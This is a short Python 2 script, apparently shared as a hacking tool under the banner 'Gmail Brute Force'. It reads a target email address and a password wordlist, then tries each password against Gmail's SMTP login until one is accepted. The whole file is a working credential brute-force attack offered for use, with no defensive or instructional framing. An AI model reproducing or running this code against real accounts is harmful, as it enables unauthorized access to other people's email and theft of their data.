import smtplib
import datetime
import sys
import platform

print "\n\n"
print "********************************************************"
print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
print "|++++++++++++++++++++\033[1;36mGmail Brute Force\033[0m+++++++++++++++++|"
print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
print "|+++++++++++++++++Author : \033[1;32mAhmed Safa\033[0m++++++++++++++++++|"
print "|+++++++++++++++facebook/\033[32mahmedsafa404\033[0m++++++++++++++++++|"

#Info
os = platform.system()
sys = platform.release()
print "|+++++++++++++++++Operating System :" +os +"++++++++++++++|"

print"|++++++++++++Released :"+sys+"++++++++++++++++|"
time = datetime.datetime.now()
print "|+++++++\033[34mDate & Time\033[0m :"+str(time)+"++++++++|"
print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
print "********************************************************"

print "\n"


server = smtplib.SMTP("smtp.gmail.com", 587)
server.ehlo()
server.starttls()

username = raw_input("Enter the Email : ")
passwordfile = raw_input("Enter the Wordlist : ")
passwordfile = open(passwordfile,"r")

for password in passwordfile:

	try:

		server.login(username,password)

		print "[+] Password Found : %s"%password
		break;

	except smtplib.SMTPAuthenticationError:

		print "[!] Password not Found : %s " %password
